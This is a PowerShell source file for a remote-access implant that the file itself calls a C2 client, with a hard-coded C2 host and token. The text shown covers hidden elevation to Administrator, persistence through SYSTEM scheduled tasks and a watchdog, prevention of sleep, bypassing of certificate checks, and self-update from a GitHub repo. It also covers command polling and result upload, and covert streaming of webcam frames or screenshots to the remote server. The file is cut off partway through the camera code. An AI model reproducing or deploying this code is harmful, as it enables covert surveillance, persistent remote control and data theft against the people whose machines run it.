# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  CONFIGURATION                                                             ║
# ║  Edit these values to match your setup. All features reference these vars. ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$Version = "3.2.8"
$cfHost = "https://connect.aniketpandey.website"
$cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
$maxRetries = 10
$cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
$maxChunkBytes = 32000  # cap per-chunk size
$clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"

# --- AUTO-UPDATE CONFIG (removable) ---
$updateUrl    = "https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1"
$updateApiUrl = "https://api.github.com/repos/pentoshi007/test/contents/pdf2.ps1"
$updateCheckMins = 30   # check for updates every N minutes
# --- end auto-update config ---

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  SELF-PATH RESOLUTION                                                      ║
# ║  Determines script location for logging, persistence, and EXE detection.   ║
# ║  Required by: LOGGING, PERSISTENCE, ADMIN ELEVATION                        ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$selfPath = $PSCommandPath
if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
if (-not $selfPath) { $selfPath = (Get-Process -Id $PID).Path }
$scriptDir = if ($PSScriptRoot) { $PSScriptRoot } elseif ($selfPath) { Split-Path -Parent $selfPath } else { $env:TEMP }
$isExePayload = ($selfPath -and [System.IO.Path]::GetExtension($selfPath).ToLower() -eq ".exe")

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  SINGLE-INSTANCE MUTEX                                                     ║
# ║  Prevents duplicate copies from running simultaneously.                    ║
# ║  Safe to remove if you don't use the watchdog task.                        ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$mutexName = "Global\SystemManagementUpdateMutex"
$createdNew = $false
try {
    # Create mutex with Everyone access so both SYSTEM and admin users can share it
    $mutexSecurity = New-Object System.Security.AccessControl.MutexSecurity
    $rule = New-Object System.Security.AccessControl.MutexAccessRule(
        "Everyone",
        [System.Security.AccessControl.MutexRights]::FullControl,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $mutexSecurity.AddAccessRule($rule)
    $script:singleInstanceMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew, $mutexSecurity)
} catch {
    # Fallback: try without security (may fail cross-user, but won't crash)
    try {
        $script:singleInstanceMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
    } catch { exit }
}
if (-not $createdNew) { exit }

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  ADMIN ELEVATION                                                           ║
# ║  Re-launches itself as Administrator in a hidden window if not already.    ║
# ║  Required by: PERSISTENCE (needs admin to register SYSTEM tasks)           ║
# ║  To remove: delete this block; script will run as current user.            ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    if ($isExePayload) {
        Start-Process -FilePath $selfPath -Verb RunAs -WindowStyle Hidden
    } else {
        Start-Process PowerShell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
    }
    exit
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  PERSISTENCE (Scheduled Tasks)                                             ║
# ║  Two tasks: main (startup+logon) + watchdog (every 1 min).                ║
# ║  Survives: reboot, shutdown, sleep, user killing process from Task Manager.║
# ║  Always re-registers with -Force to keep settings current.                ║
# ║  To remove: delete this block. Script will run only once manually.         ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$taskName = "SystemManagementUpdate"
$watchdogTaskName = "SystemManagementUpdateWatchdog"
$action = if ($isExePayload) {
    New-ScheduledTaskAction -Execute $selfPath
} else {
    New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
}
$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -WakeToRun -MultipleInstances IgnoreNew
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$startupTrigger = New-ScheduledTaskTrigger -AtStartup
$logonTrigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($startupTrigger, $logonTrigger) -Settings $settings -Principal $principal -Force | Out-Null
$watchdogAction = if ($isExePayload) {
    New-ScheduledTaskAction -Execute $selfPath
} else {
    New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
}
$watchdogTrigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
Register-ScheduledTask -TaskName $watchdogTaskName -Action $watchdogAction -Trigger $watchdogTrigger -Settings $settings -Principal $principal -Force | Out-Null

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  ANTI-SLEEP POWER POLICY (removable)                                       ║
# ║  Prevents laptop from sleeping on lid close. Without this, the machine    ║
# ║  goes to sleep and all processes freeze — no reconnection possible.        ║
# ║  Sets: lid close = do nothing, standby timeout = never (AC + battery).     ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
try {
    # Lid close action: 0 = do nothing (AC)
    powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 0 2>$null
    # Lid close action: 0 = do nothing (Battery)
    powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 0 2>$null
    # Disable standby timeout (AC)
    powercfg /change standby-timeout-ac 0 2>$null
    # Disable standby timeout (Battery — set to 30 min to save some battery)
    powercfg /change standby-timeout-dc 30 2>$null
    # Apply changes
    powercfg /setactive SCHEME_CURRENT 2>$null
} catch {}

# --- CLEANUP ORPHANED TASKS AND TEMP FILES (from previous crashes) ---
try {
    Get-ScheduledTask -TaskName "GUI_*" -ErrorAction SilentlyContinue | ForEach-Object {
        Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
    }
} catch {}
try {
    Get-ScheduledTask -TaskName "CameraCapture_*" -ErrorAction SilentlyContinue | ForEach-Object {
        try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
        Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
    }
} catch {}
try {
    Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'       -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
} catch {}
try {
    Get-ScheduledTask -TaskName "Capture_*" -ErrorAction SilentlyContinue | ForEach-Object {
        try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
        Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
    }
} catch {}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  AUTO-UPDATE (removable)                                                    ║
# ║  Periodically downloads the latest script from GitHub. If the hash differs,║
# ║  overwrites itself and exits — the watchdog relaunches the new version.    ║
# ║  Requires: $updateUrl, $updateCheckMins from CONFIGURATION.                ║
# ║  To remove: delete this block and the config vars. No other code depends.  ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$script:lastUpdateCheck = Get-Date

function Update-Self {
    <# Returns $true if script was updated and a restart is needed. #>
    try {
        $script:lastUpdateCheck = Get-Date

        # Download latest version via GitHub API (bypasses CDN cache entirely)
        $tempFile = Join-Path $env:TEMP "pdf2_update_$(Get-Random).ps1"
        try {
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
            # Step 1: hit the Contents API to get the commit-pinned download_url
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.Headers.Add("Cache-Control", "no-cache, no-store")
            $wc.Headers.Add("Pragma", "no-cache")
            $apiJson   = $wc.DownloadString($updateApiUrl)
            $wc.Dispose()
            # Extract download_url — it contains the commit SHA so it's never CDN-cached
            $dlUrl = ($apiJson | Select-String '"download_url"\s*:\s*"([^"]+)"').Matches[0].Groups[1].Value
            if (-not $dlUrl) { throw 'Could not parse download_url from GitHub API response' }
            # Step 2: download from the commit-pinned URL
            $wc2 = New-Object System.Net.WebClient
            $wc2.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc2.DownloadFile($dlUrl, $tempFile)
            $wc2.Dispose()
        } catch {
            Write-Log "Update download failed: $($_.Exception.Message)" "WARN"
            return $false
        }

        # Compare hashes
        $currentHash = (Get-FileHash -Path $selfPath -Algorithm SHA256 -ErrorAction Stop).Hash
        $newHash     = (Get-FileHash -Path $tempFile  -Algorithm SHA256 -ErrorAction Stop).Hash

        if ($currentHash -eq $newHash) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            return $false
        }

        # Different — overwrite self with new version
        Write-Log "Update found! Hash $($currentHash.Substring(0,8)).. -> $($newHash.Substring(0,8)).." "INFO"
        Copy-Item -Path $tempFile -Destination $selfPath -Force
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

        Write-Log "Updated. Releasing mutex and exiting for watchdog restart." "INFO"
        try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
        try { $script:singleInstanceMutex.Dispose() } catch {}
        return $true
    } catch {
        Write-Log "Update check error: $($_.Exception.Message)" "WARN"
        return $false
    }
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  LOGGING (shell.txt)                                                       ║
# ║  Writes timestamped logs to shell.txt beside the script.                   ║
# ║  Auto-rotates at 5 MB. Safe to remove entirely — replace all Write-Log    ║
# ║  calls with nothing. Also remove $logFile and $maxLogSizeMB from CONFIG.   ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$logFile = Join-Path $scriptDir "shell.txt"
$maxLogSizeMB = 5
$retryCount = 0

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] [$Level] $Message"
    try {
        if (Test-Path $logFile) {
            $size = (Get-Item $logFile).Length / 1MB
            if ($size -ge $maxLogSizeMB) {
                Move-Item -Path $logFile -Destination "$logFile.old" -Force
            }
        }
        Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
    } catch {}
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  TLS + SSL CERTIFICATE BYPASS                                             ║
# ║  Enables TLS 1.2/1.3 and bypasses cert validation for SYSTEM account.     ║
# ║  SYSTEM's cert store lacks Cloudflare root CAs — this fixes SSL errors.   ║
# ║  To remove: delete this block. Only safe if running as a normal user       ║
# ║  whose cert store trusts your C2 domain's certificate chain.               ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
[System.Net.ServicePointManager]::DefaultConnectionLimit = 4
[System.Net.ServicePointManager]::Expect100Continue = $false
try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 } catch {
    try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {}
}
try {
    if (-not ([System.Management.Automation.PSTypeName]'TrustAllCertsPolicy').Type) {
        Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
    }
    [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()
} catch {
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  HTTP HELPERS                                                              ║
# ║  Core transport layer — sends/receives data to the C2 server.             ║
# ║  Do NOT remove — required by STREAMING EXECUTION and MAIN LOOP.           ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
function Send-Http {
    param([string]$Url, [string]$Method = "GET", [string]$Body = $null, [int]$TimeoutMs = 10000)
    $req = [System.Net.HttpWebRequest]::Create($Url)
    $req.Method = $Method
    $req.UserAgent = "Mozilla/5.0"
    $req.Headers.Add("X-Token", $cfToken)
    $req.KeepAlive = $true
    $req.Timeout = $TimeoutMs
    $req.ReadWriteTimeout = $TimeoutMs
    if ($Method -eq "POST" -and $Body) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $req.ContentType = "text/plain; charset=utf-8"
        $req.ContentLength = $bytes.Length
        $stream = $req.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
    }
    $resp = $req.GetResponse()
    try {
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        $result = $reader.ReadToEnd()
        $reader.Close()
    } finally {
        # Always release the response/connection, even on read errors —
        # prevents slow connection-pool leaks under KeepAlive.
        $resp.Close()
    }
    return $result
}

function Get-Command-From-Server {
    # Long-poll: server holds the connection up to 30s waiting for a command.
    # Use 35s timeout on our end to give the server room to respond cleanly.
    try { return (Send-Http -Url "$cfHost/cmd?id=$clientId" -TimeoutMs 35000).Trim() } catch { throw $_ }
}

function Get-Signal-From-Server {
    try { return (Send-Http -Url "$cfHost/signal?id=$clientId" -TimeoutMs 3000).Trim() } catch { return "" }
}

function Get-Camera-Signal-From-Server {
    try { return (Send-Http -Url "$cfHost/camera_signal?id=$clientId" -TimeoutMs 3000).Trim() } catch { return "" }
}

function Send-Stream-To-Server {
    param([string]$Body)
    # Split oversized bodies into sequential chunks instead of truncating
    try {
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        if ($bodyBytes.Length -le $maxChunkBytes) {
            Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $Body | Out-Null
        } else {
            $offset = 0
            while ($offset -lt $bodyBytes.Length) {
                $len = [Math]::Min($maxChunkBytes, $bodyBytes.Length - $offset)
                $chunk = [System.Text.Encoding]::UTF8.GetString($bodyBytes, $offset, $len)
                Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $chunk | Out-Null
                $offset += $len
            }
        }
    }
    catch { Write-Log "Stream send failed: $($_.Exception.Message)" "WARN" }
}

function Send-Result-To-Server {
    param([string]$Body)
    # For large results: send leading chunks as /stream, final chunk as /result
    try {
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        if ($bodyBytes.Length -le $maxChunkBytes) {
            Send-Http -Url "$cfHost/result?id=$clientId" -Method "POST" -Body $Body | Out-Null
        } else {
            $offset = 0
            while ($offset -lt $bodyBytes.Length) {
                $len = [Math]::Min($maxChunkBytes, $bodyBytes.Length - $offset)
                $chunk = [System.Text.Encoding]::UTF8.GetString($bodyBytes, $offset, $len)
                $remaining = $bodyBytes.Length - $offset - $len
                if ($remaining -le 0) {
                    # Last chunk goes as /result to trigger prompt on server
                    Send-Http -Url "$cfHost/result?id=$clientId" -Method "POST" -Body $chunk | Out-Null
                } else {
                    Send-Http -Url "$cfHost/stream?id=$clientId" -Method "POST" -Body $chunk | Out-Null
                }
                $offset += $len
            }
        }
    }
    catch { Write-Log "Result send failed: $($_.Exception.Message)" "WARN" }
}

function Get-Stdin-From-Server {
    # No Trim — preserves whitespace for interactive stdin payloads
    try { return Send-Http -Url "$cfHost/stdin?id=$clientId" -TimeoutMs 3000 } catch { return "" }
}

function Send-Interactive-Flag {
    param([bool]$IsInteractive)
    $val = if ($IsInteractive) { "true" } else { "false" }
    try { Send-Http -Url "$cfHost/interactive?id=$clientId" -Method "POST" -Body $val | Out-Null } catch {}
}

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  CAMERA STREAMING (Pull Model)                                            ║
# ║  Client uploads JPEG frames to /camera_frame. Server stores latest frame. ║
# ║  Browser polls /camera_view page which auto-refreshes the snapshot.       ║
# ║  Stop: operator sends 'stopstream' which sets pending_signal=stopstream.  ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
$script:cameraTask       = $null
$script:cameraRunspace   = $null
$script:cameraTaskId     = $null
$script:cameraScriptPath = $null
$script:captureTaskId    = $null   # in-flight one-shot capture task
$script:captureScriptPath = $null  # corresponding temp .ps1
$script:captureOutPath   = $null   # temp .jpg output
$script:captureErrPath   = $null   # temp error log

# Helper: synchronously await a WinRT IAsyncOperation
function Invoke-WinRTAsync {
    param($AsyncOp)
    $task = [System.WindowsRuntimeSystemExtensions]::AsTask($AsyncOp)
    $task.Wait()
    if ($task.IsFaulted) { throw $task.Exception.InnerException }
    return $task.Result
}

function Start-CameraStream {
    # Load WinRT assemblies
    try {
        Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
        [void][Windows.Media.Capture.MediaCapture,                    Windows.Media.Capture,          ContentType=WindowsRuntime]
        [void][Windows.Storage.Streams.InMemoryRandomAccessStream,   Windows.Storage.Streams,        ContentType=WindowsRuntime]
        [void][Windows.Storage.Streams.DataReader,                   Windows.Storage.Streams,        ContentType=WindowsRuntime]
        [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
    } catch {
        try {
            $wc2 = New-Object System.Net.WebClient
            $wc2.Headers.Add('User-Agent','Mozilla/5.0')
            $wc2.Headers.Add('X-Token',$cfToken)
            $wc2.UploadData("$cfHost/result?id=$clientId", 'POST',
                [System.Text.Encoding]::UTF8.GetBytes("[!] Camera: WinRT load failed: $($_.Exception.Message)`n")) | Out-Null
            $wc2.Dispose()
        } catch {}
        return
    }

    $isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
    $loggedOnUser = $null
    try { $loggedOnUser = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).UserName } catch {
        try { $loggedOnUser = (Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).UserName } catch {}
    }

    if ($isSystem -and $loggedOnUser) {
        # SYSTEM PATH: scheduled task runs as logged-on user, polls /signal to stop
        $taskId = "CameraCapture_$(Get-Random)"
        $scriptPath = Join-Path $env:TEMP "cam_$taskId.ps1"
        $errLog = Join-Path $env:TEMP "cam_err_$taskId.txt"
        $captureScript = @"
param()
`$ErrorActionPreference = 'Stop'
[System.Net.ServicePointManager]::DefaultConnectionLimit = 4
try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 } catch { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 }
try { if (-not ([System.Management.Automation.PSTypeName]'TrustAllCertsPolicy').Type) { Add-Type @'
using System.Net; using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; } }
'@ }; [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new() } catch {}
function Report([string]`$msg) {
    try { [System.IO.File]::WriteAllText('$errLog', `$msg) } catch {}
    try { `$wc=New-Object System.Net.WebClient;`$wc.Headers.Add('User-Agent','Mozilla/5.0');`$wc.Headers.Add('X-Token','81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782');`$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes(`$msg)) | Out-Null;`$wc.Dispose() } catch {}
}
function UploadFrame([byte[]]`$data) {
    try {
        `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_frame?id=$clientId')
        `$r.Method='POST';`$r.ContentType='image/jpeg';`$r.ContentLength=`$data.Length;`$r.Timeout=5000;`$r.ReadWriteTimeout=5000;`$r.UserAgent='Mozilla/5.0';`$r.Headers.Add('X-Token','81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782')
        `$s=`$r.GetRequestStream();`$s.Write(`$data,0,`$data.Length);`$s.Close();`$r.GetResponse().Close()
    } catch {}
}
function ShouldStop {
    try {
        `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_signal?id=$clientId')
        `$r.Method='GET';`$r.Timeout=3000;`$r.ReadWriteTimeout=3000;`$r.UserAgent='Mozilla/5.0';`$r.Headers.Add('X-Token','81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782')
        `$resp=`$r.GetResponse();`$val=(New-Object System.IO.StreamReader(`$resp.GetResponseStream())).ReadToEnd().Trim();`$resp.Close()
        return (`$val -eq 'stopstream' -or `$val -eq 'cancel')
    } catch { return `$false }
}
function ScreenshotJpeg {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    `$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    `$bmp=New-Object System.Drawing.Bitmap(`$s.Width,`$s.Height)
    `$g=[System.Drawing.Graphics]::FromImage(`$bmp)
    `$g.CopyFromScreen(`$s.Location,[System.Drawing.Point]::Empty,`$s.Size)
    `$g.Dispose()
    `$ms=New-Object System.IO.MemoryStream
    `$bmp.Save(`$ms,[System.Drawing.Imaging.ImageFormat]::Jpeg)
    `$bmp.Dispose()
    return `$ms.ToArray()
}
# --- Find ffmpeg ---
`$ffmpeg = `$null
foreach (`$p in @('ffmpeg','C:\ffmpeg\bin\ffmpeg.exe','C:\Tools\ffmpeg.exe','C:\Windows\System32\ffmpeg.exe')) {
    if (Get-Command `$p -ErrorAction SilentlyContinue) { `$ffmpeg = `$p; break }
    if (Test-Path `$p) { `$ffmpeg = `$p; break }
}
# --- Try ffmpeg webcam, fall back to screenshot ---
`$usedFfmpeg = `$false
if (`$ffmpeg) {
    try {
        # enumerate DirectShow video devices
        `$devOut = & `$ffmpeg -list_devices true -f dshow -i dummy 2>&1 | Out-String
        `$devName = `$null
        foreach (`$line in (`$devOut -split "`n")) {
            if (`$line -match '"(.+?)"' -and `$line -match 'video') { `$devName = `$Matches[1]; break }
        }
        if (-not `$devName) {
            # fallback: grab first quoted string from dshow output
            if (`$devOut -match '"(.+?)"') { `$devName = `$Matches[1] }
        }
        if (`$devName) {
            `$usedFfmpeg = `$true
            `$i = 0
            while (`$true) {
                `$tmpJpeg = [System.IO.Path]::GetTempFileName() + '.jpg'
                try {
                    `$psi = New-Object System.Diagnostics.ProcessStartInfo `$ffmpeg
                    `$psi.Arguments = "-y -f dshow -i video=```"`$devName```" -vframes 1 -q:v 5 -f image2 ```"`$tmpJpeg```""
                    `$psi.WindowStyle = 'Hidden'; `$psi.CreateNoWindow = `$true
                    `$psi.RedirectStandardError = `$true; `$psi.UseShellExecute = `$false
                    `$proc = [System.Diagnostics.Process]::Start(`$psi)
                    `$proc.WaitForExit(4000) | Out-Null; `$proc.Dispose()
                    if (Test-Path `$tmpJpeg) {
                        `$bytes = [System.IO.File]::ReadAllBytes(`$tmpJpeg)
                        if (`$bytes.Length -gt 500) { UploadFrame `$bytes }
                    }
                } catch {}
                finally { try { Remove-Item `$tmpJpeg -Force -ErrorAction SilentlyContinue } catch {} }
                `$i++
                if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
                Start-Sleep -Milliseconds 1000  # 1 fps — halves CPU/battery/bandwidth
            }
        } else {
            throw 'no video device found'
        }
    } catch {
        Report "[!] ffmpeg webcam failed: `$(`$_.Exception.Message) -- falling back to screen capture`n"
        `$usedFfmpeg = `$false
    }
}
if (-not `$usedFfmpeg) {
    # Screenshot fallback
    `$i = 0
    try {
        while (`$true) {
            try {
                `$bytes = ScreenshotJpeg
                UploadFrame `$bytes
                `$i++
            } catch { break }
            if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
            Start-Sleep -Milliseconds 1000  # 1 fps — halves CPU/battery/bandwidth
        }
    } catch {
        Report "[!] Screenshot stream failed: `$(`$_.Exception.Message)`n"
    }
}
"@
        try {
            [System.IO.File]::WriteAllText($scriptPath, $captureScript, [System.Text.Encoding]::UTF8)
            $action    = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
                            -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$scriptPath`""
            $principal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
            $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
            Register-ScheduledTask -TaskName $taskId -Action $action -Principal $principal -Settings $settings -Force | Out-Null
            Start-ScheduledTask -TaskName $taskId
            $script:cameraTaskId = $taskId
            $script:cameraScriptPath = $scriptPath
            $script:cameraErrLog = $errLog
            Write-Log "Camera task started: $taskId" "INFO"
            # Give the task 4s to fail fast, then report any error it wrote
            Start-Sleep -Seconds 4
            if (Test-Path $errLog) {
                $errMsg = [System.IO.File]::ReadAllText($errLog).Trim()
                if ($errMsg) { Send-Stream-To-Server -Body "$errMsg`n" }
            }
        } catch {
            Write-Log "Camera task failed: $($_.Exception.Message)" "WARN"
            try {
                $wc2 = New-Object System.Net.WebClient; $wc2.Headers.Add('User-Agent','Mozilla/5.0')
                $wc2.Headers.Add('X-Token',$cfToken)
                $wc2.UploadData("$cfHost/result?id=$clientId", 'POST',
                    [System.Text.Encoding]::UTF8.GetBytes("[!] Camera task start failed: $($_.Exception.Message)`n")) | Out-Null
                $wc2.Dispose()
            } catch {}
        }
        return  # Main loop continues; capture task is independent
    }

    # NORMAL USER PATH: background runspace, sharedState set BEFORE BeginInvoke
    $script:sharedState = [hashtable]::Synchronized(@{ CameraRunning = $true })
    $rs = [runspacefactory]::CreateRunspace()
    $rs.Open()
    $rs.SessionStateProxy.SetVariable('cfHost',      $cfHost)
    $rs.SessionStateProxy.SetVariable('clientId',    $clientId)
    $rs.SessionStateProxy.SetVariable('sharedState', $script:sharedState)
    $rs.SessionStateProxy.SetVariable('cfToken',    $cfToken)
    $script:cameraRunspace = $rs

    $ps = [powershell]::Create()
    $ps.Runspace = $rs
    $ps.AddScript({
        $ErrorActionPreference = 'SilentlyContinue'
        function UploadFrame([byte[]]$data) {
            try {
                $req = [System.Net.HttpWebRequest]::Create("$cfHost/camera_frame?id=$clientId")
                $req.Method='POST'; $req.ContentType='image/jpeg'; $req.ContentLength=$data.Length
                $req.Headers.Add('X-Token', $cfToken)
                $req.Timeout=5000; $req.ReadWriteTimeout=5000; $req.UserAgent='Mozilla/5.0'
                $s = $req.GetRequestStream(); $s.Write($data, 0, $data.Length); $s.Close()
                $req.GetResponse().Close()
            } catch {}
        }
        function Report([string]$msg) {
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add('User-Agent','Mozilla/5.0')
                $wc.Headers.Add('X-Token', $cfToken)
                $wc.UploadData("$cfHost/result?id=$clientId", 'POST',
                    [System.Text.Encoding]::UTF8.GetBytes($msg)) | Out-Null
                $wc.Dispose()
            } catch {}
        }
        function ScreenshotJpeg {
            Add-Type -AssemblyName System.Windows.Forms,System.Drawing
            $scr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bmp = New-Object System.Drawing.Bitmap($scr.Width, $scr.Height)
            $g   = [System.Drawing.Graphics]::FromImage($bmp)
            $g.CopyFromScreen($scr.Location, [System.Drawing.Point]::Empty, $scr.Size)
            $g.Dispose()
            $ms  = New-Object System.IO.MemoryStream
            $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $bmp.Dispose()
            return $ms.ToArray()
        }
        # --- Find ffmpeg ---
        $ffmpeg = $null
        foreach ($p in @('ffmpeg','C:\ffmpeg\bin\ffmpeg.exe','C:\Tools\ffmpeg.exe','C:\Windows\System32\ffmpeg.exe')) {
            if (Get-Command $p -ErrorAction SilentlyContinue) { $ffmpeg = $p; break }
            if (Test-Path $p) { $ffmpeg = $p; break }
        }
        $usedFfmpeg = $false
        if ($ffmpeg) {
            try {
                $devOut = & $ffmpeg -list_devices true -f dshow -i dummy 2>&1 | Out-String
                $devName = $null
                foreach ($line in ($devOut -split "`n")) {
                    if ($line -match '"(.+?)"' -and $line -match 'video') { $devName = $Matches[1]; break }
                }
                if (-not $devName -and $devOut -match '"(.+?)"') { $devName = $Matches[1] }
                if ($devName) {
                    $usedFfmpeg = $true
                    $i = 0
                    while ($sharedState.CameraRunning) {
                        $tmpJpeg = [System.IO.Path]::GetTempFileName() + '.jpg'
                        try {
                            $psi = New-Object System.Diagnostics.ProcessStartInfo $ffmpeg
                            $psi.Arguments = "-y -f dshow -i video=`"`$devName`" -vframes 1 -q:v 5 -f image2 `"`$tmpJpeg`""
                            $psi.WindowStyle = 'Hidden'; $psi.CreateNoWindow = $true
                            $psi.RedirectStandardError = $true; $psi.UseShellExecute = $false
                            $proc = [System.Diagnostics.Process]::Start($psi)
                            $proc.WaitForExit(4000) | Out-Null; $proc.Dispose()
                            if (Test-Path $tmpJpeg) {
